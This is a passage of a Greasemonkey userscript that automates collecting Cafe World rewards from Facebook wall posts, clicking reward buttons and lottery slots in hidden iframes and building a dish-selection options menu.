//               var taste_test_conts_links = taste_test_conts.item(0).getElementsByTagName('a');

//               var taste_test_conts = doc.getElementById('app101539264719_item_wrapper');
//               var taste_test_conts_links = taste_test_conts.getElementsByTagName('a');
//               GM_log("taste_test_conts_links len= " + taste_test_conts_links.length);
//               
//               GM_log("taste_test_conts_links item(0) " + taste_test_conts_links.item(0).href);    
//               GM_log("taste_test_conts_links item(1) " + taste_test_conts_links.item(1).href);    
//               
//               if (taste_test_conts_links.length > 0)
//               {
//               	e.target.src = taste_test_conts_links.item(0).href;
//               }


//     					if (taste_test_conts.length > 0)
//     					{
//     						e.target.src=taste_test_conts.item(0).href;
//     					}
// 							else
//               {
//                 var dishTargetUrl = url + '&accept=1';
//       	   		  e.target.src = dishTargetUrl;
//               }
    					break;

    			case 'masterybonus'  :   
              GM_log("Entered Select Block Option - masterybonus");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("masterybonus Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var got_mb = doc.getElementsByClassName('ok reward-button');
              if (got_mb.length > 0)
              {
                clickLink(got_mb.item(0));
              	e.target.src=got_mb.item(0).href;
              }
              break;

					case 'outsidemission'  :   
              var get_vipsalad_button = doc.getElementsByClassName('ok reward-button');
    					if (get_vipsalad_button.length > 0)                  
    					{
    						e.target.src=get_vipsalad_button.item(0).href;
    					}
    					break;

					case 'cateringmissionreminder'  :   
              GM_log("Entered Select Block Option - cateringmissionreminder");

              var get_cateringmissionreminder_button = doc.getElementsByClassName('ok reward-button');
    					if (get_cateringmissionreminder_button.length > 0)                  
    					{
    						e.target.src=get_cateringmissionreminder_button.item(0).href;
    					}
    					break;

					case 'cateringhelpfriend'  :   
              GM_log("Entered Select Block Option - cateringhelpfriend");

              var get_cateringhelpfriend_button = doc.getElementsByClassName('ok reward-button');
    					if (get_cateringhelpfriend_button.length > 0)                  
    					{
    						e.target.src=get_cateringhelpfriend_button.item(0).href;
    					}
    					break;

					case 'machinemastery'  :   
              GM_log("Entered Select Block Option - machinemastery");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("machinemastery Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var get_machinemastery_button = doc.getElementsByClassName('ok reward-button');
    					if (get_machinemastery_button.length > 0)                  
    					{
    						e.target.src=get_machinemastery_button.item(0).href;
    					}
              else
              {
                  var machinemastery_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (machinemastery_conts.length > 0)
                  {
                    e.target.src=machinemastery_conts.item(slot_number).href;
                  }
              }
    					break;


			    case 'friendspice'  : 
              GM_log("Entered Select Block Option - friendspice");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("friendspice Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var reward_container_conts = doc.getElementsByClassName('reward-container');
              GM_log("friendspice reward_container_conts len= " + reward_container_conts.length);

              var reward_container_links = reward_container_conts.item(0).getElementsByTagName('a');
              GM_log("friendspice reward_container_links len= " + reward_container_links.length);
              
              GM_log("friendspice reward_container_links item(0) " + reward_container_links.item(0).href);    
              
              if (reward_container_links.length > 0)
              {
                clickLink(allLinks.item(0));
              	e.target.src = reward_container_links.item(0).href;
              	break;
              }
              

              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById("app101539264719_tab_container") ) {
                allLinks = wrapperdiv.getElementsByTagName('a');

                if (allLinks.length > 0) {
              	 e.target.src = allLinks.item(0).href;
                }

              }

//                wrapperdiv = doc.getElementById('app101539264719_tab_container');
//                allLinks = wrapperdiv.getElementsByTagName('a');

              
              break;

			    case 'friend_spice_reward'  : 
              GM_log("Entered Select Block Option - friend_spice_reward");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("friend_spice_reward Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var reward_container_conts = doc.getElementsByClassName('reward-container');
              GM_log("friend_spice_reward reward_container_conts len= " + reward_container_conts.length);

              var reward_container_links = reward_container_conts.item(0).getElementsByTagName('a');
              GM_log("friend_spice_reward reward_container_links len= " + reward_container_links.length);
              
              GM_log("friend_spice_reward reward_container_links item(0) " + reward_container_links.item(0).href);    
              
              if (reward_container_links.length > 0)
              {
                clickLink(allLinks.item(0));
              	e.target.src = reward_container_links.item(0).href;
              	break;
              }
              

              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById("app101539264719_tab_container") ) {
                allLinks = wrapperdiv.getElementsByTagName('a');

                if (allLinks.length > 0) {
              	 e.target.src = allLinks.item(0).href;
                }

              }

//                wrapperdiv = doc.getElementById('app101539264719_tab_container');
//                allLinks = wrapperdiv.getElementsByTagName('a');

              
              break;



// 			    case 'friendspice'  : 
//               if(doc.body.textContent.indexOf("Looks like all the prizes have been claimed!") != -1)
//               {
//                 GM_log("friendspice - doc.body contains >> Looks like all the prizes have been claimed!");
//                 break;
//               } 
//               else
//               {
//                 var currentLocation = doc.location;
//                 GM_log("specialType Select block - processing friendspice - currentLocation = " + currentLocation);
//                 spiceTargetUrl = currentLocation + '&send_key=&tracked=1&action=64&area=1';
//                 GM_log("specialType Select block - processing friendspice - spiceTargetUrl = " + spiceTargetUrl);
//       	   		  e.target.src = spiceTargetUrl;
//       	   		  break;
//               }
//              
//               var reward_container_conts = document.getElementsByClassName('reward-container');
//               GM_log("friendspice reward_container_conts len= " + reward_container_conts.length);
// 
//               // var reward_container_conts2 = document.getElementsByClassName('scratch-area');
//               // GM_log("friendspice reward_container_conts2 len= " + reward_container_conts.length);
//             
//               var reward_container_links = reward_container_conts.item(0).getElementsByTagName('a');
//               GM_log("friendspice reward_container_links len= " + reward_container_links.length);
//               
//               // var reward_container_links2 = reward_container_conts2.getElementsByTagName('a');
//               // GM_log("friendspice reward_container_links2 len= " + reward_container_links2.length);
//               
//               GM_log("friendspice reward_container_links item(0) " + reward_container_links.item(0).href);    
//               
//               if (reward_container_links.length > 0)
//               {
//               	e.target.src = reward_container_links.item(0).href;
//               }
//               break;
// 
// 					case 'friend_spice_reward'  : 
//               if(doc.body.textContent.indexOf("Looks like all the prizes have been claimed!") != -1)
//               {
//                 // GM_log("friend_spice_reward - doc.body contains >> Looks like all the prizes have been claimed!");
//                 break;
//               }
// 
//               var friend_spice_reward_conts = doc.getElementsByClassName('ok reward-button');	
//               // GM_log("friend_spice_reward_conts-OKbutton len= " + friend_spice_reward_conts.length);
//               if (friend_spice_reward_conts.length > 0)
//               {
//                 e.target.src=friend_spice_reward_conts.item(0).href;
//               }
//               else
//               {
// //                 var friend_spice_reward_conts = doc.getElementsByClassName('lotto-container');
// //                 // GM_log("friend_spice_reward_conts-LottoCont len= " + friend_spice_reward_conts.length);
// //                 var slot_number = Math.floor(Math.random()*3+1);
// //                 if (friend_spice_reward_conts.length > 0)
// //                 {
// //                   e.target.src=friend_spice_reward_conts.item(slot_number).href;
// //                 }
//                 // If not first one to collect, window displays message
//                 // "You weren't the first to claim the prize from Joe Doe, but please pick a mystery gift as a thank you!
//                 // CLICK A GIFT TO UNWRAP IT! " and appears as a (div class="lotto-container") style window
//                 // with 3 links with class names scratch-area area-1, scratch-area area-2, and scratch-area area-3
//                 var which_button_number = "scratch-area area-" + Math.floor(Math.random()*3+1);
//                 var friend_spice_reward_conts = document.getElementsByClassName(which_button_number);
//   							if (friend_spice_reward_conts.length > 0)
//   							{
//   						    e.target.src=friend_spice_reward_conts.item(0).href;
//   							}
//               }
//               break;
// 
          case 'mystery_spice'  :   
              GM_log("Entered Select Block Option - mystery_spice");
              
              if ( failedItem(doc.body.textContent) ) {
                GM_log("mystery_spice Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById("app101539264719_item_wrapper") ) {
                allLinks = wrapperdiv.getElementsByTagName('a');

                GM_log("mystery_spice allLinks len= " + allLinks.length);
                GM_log("mystery_spice allLinks item(0) " + allLinks.item(0).href);    
                GM_log("mystery_spice allLinks item(1) " + allLinks.item(1).href);    

              }
              else {
                break;
              }                

//                 wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
//                 allLinks = wrapperdiv.getElementsByTagName('a');


                if (allLinks.length > 0) {
                 clickLink(allLinks.item(0));
              	 e.target.src = allLinks.item(0).href;  // still first link - 04-15-11
                }
                
                break;

//               // GM_log("mystery_spice case switch entered");
//               var mystery_spice_conts = doc.getElementsByClassName('cell_wrapper');
//               // GM_log("mystery_spice cell_wrapper mystery_spice_conts len= " + mystery_spice_conts.length);
//               if (mystery_spice_conts.length > 0)
//               {
//                 e.target.src=mystery_spice_conts.item(0).href;
//               }
//               else
//               {
//                 var mystery_spice_conts = document.getElementById('app101539264719_item_wrapper');
//                 // GM_log("mystery_spice divitemwrapper mystery_spice_conts len= " + mystery_spice_conts.length);
//             
//                 var mystery_spice_links = mystery_spice_conts.item(0).getElementsByTagName('a');
//                 // GM_log("mystery_spice divitemwrapper mystery_spice_links len= " + mystery_spice_links.length);
//               
//                 // GM_log("mystery_spice divitemwrapper mystery_spice_links item(0) " + mystery_spice_links.item(0).href);    
//                 // GM_log("mystery_spice divitemwrapper mystery_spice_links item(1) " + mystery_spice_links.item(1).href);    
//               
//                 if (mystery_spice_links.length > 0)
//                 {
//               	 e.target.src = mystery_spice_links.item(0).href;
//                 }
//               }
//               break;

					case 'birthdaycake'  : 
              if ( failedItem(doc.body.textContent) ) {
                GM_log("birthdaycake Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var birthdaycake_conts = doc.getElementsByClassName('ok reward-button');	
              if (birthdaycake_conts.length > 0)
              {
                  e.target.src=birthdaycake_conts.item(0).href;
              }
              else
              {
                  var birthdaycake_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (birthdaycake_conts.length > 0)
                  {
                    e.target.src=birthdaycake_conts.item(slot_number).href;
                  }
              }
              break;

					case 'friendmission'  : 
              GM_log("Entered Select Block Option - friendmission");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("friendmission Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var friendmission_conts = doc.getElementsByClassName('ok reward-button');	
              if (friendmission_conts.length > 0)
              {
                  e.target.src=friendmission_conts.item(0).href;
              }
              else
              {
                  var friendmission_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (friendmission_conts.length > 0)
                  {
                    e.target.src=friendmission_conts.item(slot_number).href;
                  }
              }
              break;

					case 'coffeefirstbrewfeed'  : 
              GM_log("Entered Select Block Option - coffeefirstbrewfeed");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("coffeefirstbrewfeed Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var coffeefirstbrewfeed_conts = doc.getElementsByClassName('ok reward-button');	
              if (coffeefirstbrewfeed_conts.length > 0)
              {
                  e.target.src=coffeefirstbrewfeed_conts.item(0).href;
              }
              else
              {
                  var coffeefirstbrewfeed_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (coffeefirstbrewfeed_conts.length > 0)
                  {
                    e.target.src=coffeefirstbrewfeed_conts.item(slot_number).href;
                  }
              }
              break;

					case 'questcompletefeed'  : 
              GM_log("Entered Select Block Option - questcompletefeed");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("questcompletefeed Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var questcompletefeed_conts = doc.getElementsByClassName('ok reward-button');	
              if (questcompletefeed_conts.length > 0)
              {
                  e.target.src=questcompletefeed_conts.item(0).href;
              }
              else
              {
                  var questcompletefeed_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (questcompletefeed_conts.length > 0)
                  {
                    e.target.src=questcompletefeed_conts.item(slot_number).href;
                  }
              }
              break;

					case 'bigtipper'  : 
              GM_log("Entered Select Block Option - bigtipper");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("bigtipper Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var bigtipper_conts = doc.getElementsByClassName('ok reward-button');	
              if (bigtipper_conts.length > 0)
              {
                  e.target.src=bigtipper_conts.item(0).href;
              }
              else
              {
                  var bigtipper_conts = doc.getElementsByClassName('lotto-container');
                  var slot_number = Math.floor(Math.random()*3+1);
                  if (bigtipper_conts.length > 0)
                  {
                    e.target.src=bigtipper_conts.item(slot_number).href;
                  }
              }
              break;

					case 'collections'  : 
              GM_log("Entered Select Block Option - collections");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("Collections Item Grab Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              var wrapperdiv = "", allforms = "";  
//               if ( wrapperdiv = doc.getElementById("app101539264719_item_wrapper") ) {
//                 allforms = wrapperdiv.getElementsByTagName("form");
//               }
//               else {
//                 break;
//               }                
                wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
                allforms = wrapperdiv.getElementsByTagName('form');


              for (var i=0; i<=allforms.length - 1; i++)
              {
                // GM_log("Form #" + i + " ID = " + allforms[i].id);
                if (allforms[i].id.indexOf('app101539264719_form') == 0)
                {
                  // GM_log("Form #" + i + " contains ID = " + allforms[i].id);
                  allforms[i].submit();
                }     
              }
              break;

					case 'buildanx'  : 
              GM_log("Entered Select Block Option - buildanx");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("buildanx Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              var wrapperdiv = "", allLinks = "";  
//               if ( wrapperdiv = doc.getElementById("app101539264719_item_wrapper") ) {
//                 allLinks = wrapperdiv.getElementsByTagName('a');
//               }
//               else {
//                 break;
//               }                

                wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
                allLinks = wrapperdiv.getElementsByTagName('a');


              if (allLinks.length > 0) {
            	 e.target.src = allLinks.item(0).href;
              }
              
              break;

					case 'specialdelivery'  : 
              GM_log("Entered Select Block Option - specialdelivery");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("specialdelivery Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById('app101539264719_error_wrapper') ) {
                allLinks = wrapperdiv.getElementsByTagName('a');
              }
              else {
                break;
              }                

              if (allLinks.length > 0) {
            	 // e.target.src = allLinks.item(1).href;  // 2nd link is no button
            	 // Changed 02-12-11 - now shows a single "Play" button
               e.target.src = allLinks.item(0).href;  // 2nd link is no button
              }
              
              break;

					case 'cookingacademy'  : 
              GM_log("Entered Select Block Option - cookingacademy");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("cookingacademy Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById('app101539264719_error_wrapper') ) {
                allLinks = wrapperdiv.getElementsByTagName('a');
              }
              else {
                break;
              }                

              if (allLinks.length > 0) {
            	 e.target.src = allLinks.item(0).href;  // 1st link is button
              }
              
              break;

					case 'moneytree'  : 
              if ( failedItem(doc.body.textContent) ) {
                GM_log("moneytree Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              var wrapperdiv = "", allLinks = "";  
              if ( wrapperdiv = doc.getElementById('app101539264719_error_wrapper') ) {
                allLinks = wrapperdiv.getElementsByTagName('a');
              }
              else {
                break;
              }                

              if (allLinks.length > 0) {
            	 e.target.src = allLinks.item(0).href;  // 1st link is button
              }
              
              break;

    			case 'questaskforhelp'  :   
              GM_log("Entered Select Block Option - questaskforhelp");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("questaskforhelp Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var got_mb = doc.getElementsByClassName('ok reward-button');
              if (got_mb.length > 0)
              {
                clickLink(got_mb.item(0));
              	e.target.src=got_mb.item(0).href;
              }
              break;

    			case 'pastrystationfeed'  :   
              GM_log("Entered Select Block Option - pastrystationfeed");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("pastrystationfeed Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var got_mb = doc.getElementsByClassName('ok reward-button');
              if (got_mb.length > 0)
              {
                clickLink(got_mb.item(0));
              	e.target.src=got_mb.item(0).href;
              }
              break;

    			case 'bbqgrillfeed'  :   
              GM_log("Entered Select Block Option - bbqgrillfeed");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("bbqgrillfeed Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var got_mb = doc.getElementsByClassName('ok reward-button');
              if (got_mb.length > 0)
              {
                clickLink(got_mb.item(0));
              	e.target.src=got_mb.item(0).href;
              }
              break;

    			case 'assemblythanks'  :   
              GM_log("Entered Select Block Option - assemblythanks");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("assemblythanks Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var got_mb = doc.getElementsByClassName('ok reward-button');
              if (got_mb.length > 0)
              {
                clickLink(got_mb.item(0));
              	e.target.src=got_mb.item(0).href;
              }
              break;


					case 'waterfall' :   
              var got_it = doc.getElementsByClassName('ok reward-button');
    					if (got_it.length > 0)
    					{
    						e.target.src=got_it.item(0).href;
    					}
    					break;

					case 'lost_recipe' :	
              var lost_type = main.whichLostRecipe(doc.location);
    					if (main.opts[lost_type] == false)
    					{
    						item.textContent = 'This Recipe Disabled';
    						item.style.fontWeight = "bold"; // make item link bold
    						main.opts['colorize']?item.parentNode.parentNode.parentNode.parentNode.style.backgroundColor = feedItems[w].accColor:'';
    						main.remove(key);
    						return;
    					}
    					var pie_type = main.opts['recipe_points'] ? "//a[contains(@href, 'from_snood')]" : "//a[contains(@href, 'eat_whole')]";
    					var snoodyHRefs = doc.evaluate(pie_type, doc, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    					e.target.src=snoodyHRefs.snapshotItem(0);
    					break;

					case 'friend_helping_page'	:	
              var gift_conts = doc.getElementsByClassName('app101539264719_gift_items');
    					var slot_number = main.opts['friend_helping_slot']!=3?main.opts['friend_helping_slot']:Math.floor(Math.random()*2)+1;
    					var mySlot = "app101539264719_frmGifts"+slot_number;
    					if (doc.getElementById(mySlot))
    					{
    						// Change Form's target so it opens in iframe instead of parent window.
    						doc.getElementById(mySlot).target = '_self';
    						doc.getElementById(mySlot).submit();
    					}
    					break;

					case 'build_a_stove' :	
              var gift_conts = doc.getElementsByClassName('app101539264719_gift_items');
							var slot_number = main.opts['build_a_stove_slot']!=2?main.opts['build_a_stove_slot']:Math.floor(Math.random()*1)+1;
							if (doc.getElementById('app101539264719_frmGifts1'))
							{
							  // Change Form's target so it opens in iframe instead of parent window.
                var formList = doc.evaluate("//form[contains(@id,'app101539264719_frmGifts1')]", doc, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
  							formList.snapshotItem((slot_number)).target = '_self';
	   						formList.snapshotItem((slot_number)).submit();
						  }
						  break;

// 					case 'scratch_lotto' :	
//               var lotto_conts = doc.getElementsByClassName('lottoContainer');
//     					var slot_number = main.opts['scratchoff_slot']!=4?main.opts['scratchoff_slot']:Math.floor(Math.random()*3)+1;
//     					if (lotto_conts.length > 0)
//     					{
//     						var myString = "app101539264719_lottoScratchButton"+slot_number;
//     						var theslot = doc.getElementById(myString);
//     						e.target.src=theslot.href;
//     					}
//     					break;

					case 'scratch_lotto' :
              GM_log("Entered Select Block Option - scratch_lotto");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("scratch_lotto Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }
              
              // var ifrmdoc = document.getElementById(key).contentDocument; // Get 'fresh' reference to iframe for this request
              var lotto_conts = doc.getElementsByClassName('lottoContainer');
              // GM_log("Scratch Lotto lotto_conts Selected from ifrmdoc - length = " + lotto_conts.length);

    					// var slot_number = main.opts['scratchoff_slot']!=4?main.opts['scratchoff_slot']:Math.floor(Math.random()*3)+1;
    					// var slot_number = 1;
    					
    					if (lotto_conts.length > 0)
    					{
                var lotto_conts_links = lotto_conts[0].getElementsByTagName("a");
                // GM_log("Scratch Lotto Buttons Selected from lotto_conts_links - length = " + lotto_conts_links.length);
    						// var myString = "app101539264719_lottoScratchButton"+slot_number;
    						// var theslot = doc.getElementById(myString);
    						// experimental change in lotto ticket handling.  try clicking the link instead of
    						// just loading it via the line below then click the continue button after a delay
    						// e.target.src=theslot.href;

     		        var scratchoff_number = Math.floor(Math.random()*3+1) - 1;

 								// clickLink(theslot);
 								clickLink(lotto_conts_links[scratchoff_number]);
 								sleep(250); // Pause to allow ajax request to process
 								// Force reflow/repaint of DOM
                var body = doc.getElementsByTagName( "body" )[0];
                var bodyClass = body.className;
                GM_log("bodyClass = " + body.className);
            
                body.className = "forceReflow";
                GM_log("bodyClass = " + body.className);
            
                body.className = bodyClass;
                GM_log("bodyClass = " + body.className);
 								
                // e.target.src=lotto_conts_links[scratchoff_number].href;
                e.target.src="http://apps.facebook.com/cafeworld/track.php?channel=level_up_lotto&k=level_up_lotto_result&p=continue&from=level_up_lotto_landing_page";


                // GM_log("Scratch Lotto Button Selected = " + scratchoff_number); 
                // GM_log("Scratch Lotto Button Link = " + lotto_conts_links[scratchoff_number].href.toLowerCase());
 								
//                 var lotto_allbuttons_div = ifrmdoc.getElementById('app101539264719_all_buttons');
//                 // GM_log("lotto_allbuttons_div len = ");
//                 // GM_log(lotto_allbuttons_div.length);
//             
//                 var lotto_allbuttons_links = lotto_allbuttons_div.getElementsByTagName("a");
//                 // GM_log("lotto_allbuttons_links len = ");
//                 // GM_log(lotto_allbuttons_links.length);
//               
//                 // GM_log("lotto_allbuttons_links item(0) " + lotto_allbuttons_links.item(0).href);    
//                 // GM_log("lotto_allbuttons_links item(1) " + lotto_allbuttons_links.item(1).href);
//                 
//              
//                 if (lotto_allbuttons_links.length > 0)
//                 {
//    								// sleep(500); // Pause to allow ajax request to process
//      						  // e.target.src=lotto_conts_links[0].href;
//    								
// 
//                 }
   						
    					}

    					
				}
				accTime[w][key] = new Date().getTime();
				main.setAcceptedTime(accTime);
				acc[w].push(key);
				main.setAccepted(acc);
				item.setAttribute("id", "item_done_"+key);
				item.textContent = feedItems[w].accText;
				item.style.fontWeight = "bold"; // make item link bold
				main.opts['colorize']?item.parentNode.parentNode.parentNode.parentNode.style.backgroundColor = feedItems[w].accColor:'';
				main.remove(key);
				// auto click "like" if enabled
				if(main.opts["autolike"]) main.like("item_done_"+key);
			} else {
				accTime[w][key] = new Date().getTime();
				main.setAcceptedTime(accTime);
				acc[w].push(key);
				main.setAccepted(acc);
				item.setAttribute("id", "item_done_"+key);
				item.textContent = feedItems[w].accText;
				item.style.fontWeight = "bold"; // make item link bold
				main.opts['colorize']?item.parentNode.parentNode.parentNode.parentNode.style.backgroundColor = feedItems[w].accColor:'';
				main.remove(key);
				// auto click "like" if enabled
				if(main.opts["autolike"]) main.like("item_done_"+key);
			}
		} else
			main.remove(key);

		if(doc.URL.find("max_gift") || doc.body.textContent.find("gift box is full")) { // auto-pause when signal received of a full gift box
			main.boxFull =  true;
			main.pauseClick = true;
			main.paused = true;
			$("status").style.backgroundColor = "#FF0000";
			$g("//div[@id='silent_req_holder']/iframe", {del:true});
		}
	}}));
	
	window.setTimeout(main.remove, Math.round(main.opts["reqtimeout"]*1000), key);
},

// core function. this loops through posts and loads them
run : function() {
	if($("GM_config") || main.currReqs >= main.opts["maxrequests"])
	{
		return;
	}

  // Only execute core run function if we're on the filter page - this patch allows the config options link
  // to be displayed on the home page and the GM menu - RTWG 09-03-10
  // Added config option (like FVWM) to allow running on other than the filter page - 09-09-10 RTWG
  if (window.location.href.indexOf('?filter=app_101539264719') == -1) 
  {
    if (main.opts["runOnFilterPageOnly"]) 
    {
      document.getElementById("status").style.visibility = "hidden"; // Hide status box
      return;
    }  
  }

  document.getElementById("status").style.visibility = "visible"; // Show status box


// Fixed due to changes by Facebook eliminating the clickable link on the wall posts - RTWS - 02-10-11
// Restored old code 02-12-11  
	var opts=main.opts, wallposts=$g(".//a[contains(@href,'"+main.gameURLpart+"') and not(starts-with(@id,'item_done_')) and contains(@href,'"+main.gameKeyUrlKeyword+"=') and contains(@href,'click=action') and not(contains(.,'"+main.xpQueryTextExcludes.join("')) and not(contains(.,'")+"'))]", {type:7, node:$(main.streamID)});

// Temp fix code for link problem
// 	var opts=main.opts, wallposts=$g(".//a[contains(@href,'"+main.gameURLpart+"') and not(starts-with(@id,'item_done_')) and contains(@href,'"+main.gameKeyUrlKeyword+"=') and contains(@class,'UIImageBlock_Image') and not(contains(.,'"+main.xpQueryTextExcludes.join("')) and not(contains(.,'")+"'))]", {type:7, node:$(main.streamID)});

	if(wallposts.snapshotLength==0)
	{
		return;
	}
	var open=main.open, getKey=main.getKey,
		which=main.which, whichDish=main.whichDish, acc=main.getAccepted(), accTime=main.getAcceptedTime();

	// Loop through and grab stuff
	var ssi=wallposts.snapshotItem, i=0, len=wallposts.snapshotLength;
	do {
		var item=wallposts.snapshotItem(i), key = getKey(item.href), w = which(item);
		try {
			if(w!="none" && !acc[w]) {
				acc[w] = new Array();
				main.setAccepted(acc);
			}
			if(w!="none" && !accTime[w]) {
				accTime[w] = {};
				main.setAcceptedTime(accTime);
			}
			if(w!="none" && !feedItems[w]) {
				feedItems[w] = { accText : 'Not Supported Yet', nsyColor : "yellow" };
			}
		
		} catch(e) {
			if(acc[w]=="undefined") {
				acc[w] = new Array();
				main.setAccepted(acc);
			}
			if(accTime[w]=="undefined") {
				accTime[w] = {};
				main.setAcceptedTime(accTime);
			}
			if(feedItems[w]=="undefined") {
				feedItems[w] = { accText : 'Not Supported Yet', nsyColor : "yellow" };
			}
		}

		if(w!="none")
		{
			switch(acc[w].inArray(key)) {
				case false: if(!$(key))
							{
								item.setAttribute("id", "item_"+key);
								switch(w) {
									// Changed 10-17-10 RTWS - see changelog
                  // case "dish": if(opts[whichDish(item)]) open(item.href+'&accept=1', key, w); break; // open request in iframe
									// default: switch(opts[w]) {case true: open(item.href+'&accept=1', key, w); break;} // open request in iframe
									case "dish": if(opts[whichDish(item)]) open(item.href, key, w); break; // open request in iframe
									default: switch(opts[w]) {case true: open(item.href, key, w); break;} // open request in iframe
								}
							} break;
				default: item.textContent = feedItems[w].accText;
						 item.style.fontWeight = "bold"; // make item link bold
						 item.setAttribute("id", "item_done_"+key); // add id so it can be styled if wanted
						 main.opts['colorize']?item.parentNode.parentNode.parentNode.parentNode.style.backgroundColor = feedItems[w].accColor:'';
			}
		} else if (item.href.indexOf('index.php') == -1) {
			main.opts['colorize']?item.parentNode.parentNode.parentNode.parentNode.style.backgroundColor = '#f9f57e':'';
		}
	} while (++i < len);

	switch(main.opts["removedone"] == true) {case true: main.removeDone(); break;}
} // End of run()
};

main.keyRegex = new RegExp("&(?:amp;)?"+main.gameKeyUrlKeyword+"=([^&]+)", "i");

// pre-load the config
if($("pagelet_navigation")) { // run script if on homepage

	// add stylesheets
	GM_addStyle(""+
	"#"+main.streamID+" a[id^=\"item_done_\"] {font-weight: bold; font-size: 12px; color: #008800;}\n"+
	"#"+main.streamID+" a[id^=\"item_\"]:not([id^=\"item_done_\"]):not([id^=\"item_failed_\"]):not([id^=\"item_processing_\"]) {font-weight: normal; font-size: 10px; color: #6E6E6E;}\n"+
	"#"+main.streamID+" a[id^=\"item_processing_\"] {color: #DFDF00 !important;}\n"+
	"#"+main.streamID+" a[id^=\"item_failed_\"] {font-weight: bold; font-size: 12px; color: #D70000;}"+

	(GM_config.get("colorcode")===true ? "\n\n"+
	"*[id^=\"stream_story_\"], .itemneutral , .itemneutral div[id$=\"_collapsed\"] {background-color: #E8E8E8;}"+
	".itemdone, .itemdone div[id$=\"_collapsed\"] {background-color: #91FF91 !important;}\n"+
	".itemprocessing, .itemprocessing div[id$=\"_collapsed\"] {background-color: #FFFF7D !important;}\n"+
	".itemfailed, .itemfailed div[id$=\"_collapsed\"] {background-color: #FF7171 !important;}"+
	"#"+main.streamID+" a[id^=\"item_\"] {color: #000000 !important;}" : "")+

	(GM_config.get("removedone")===true ? "\n\n"+
	".itemdone, .itemfailed {display: none !important;}" : "")
	);

	GM_config.init("<img src='"+imgs.logo+"'> v"+version, {
	'atomic_buffalo_wings' : {
		'section' : [ "Dish Types - Coins Per Serving" ],
		'label' : "Atomic Buffalo Wings - 3",
		'type' : "checkbox",
		'default' : true
	},
	'bacon_cheeseburger' : {
		'label' : "Bacon Cheeseburger - 4",
		'type' : "checkbox",
		'default' : true,
		'kids' : {
			'bacon_and_eggs' : {
				'label' : "Bacon and Eggs - 6",
				'type' : "checkbox",
				'default' : true
			},	
			'bbq_chicken' : {
				'label' : "BBQ Chicken - 7",
				'type' : "checkbox",
				'default' : true
			},
			'belgian_waffles' : {
				'label' : "Belgian Waffles - 4",
				'type' : "checkbox",
				'default' : true
			},
			'buttermilk_pancakes' : {
				'label' : "Buttermilk Pancakes - 5",
				'type' : "checkbox",
				'default' : true
			}
		}
	},
	'caramel_apples' : {
		'label' : "Caramel Apples - 4",
		'type' : "checkbox",
		'default' : true,
		'kids' : {
			'chashu_ramen' : {
				'label' : "Chashu Ramen - 3",
				'type' : "checkbox",
				'default' : true
			},
			'chicken_adobo' : {
				'label' : "Chicken Adobo - 7",
				'type' : "checkbox",
				'default' : true
			},
			'chicken_gyro_and_fries' : {
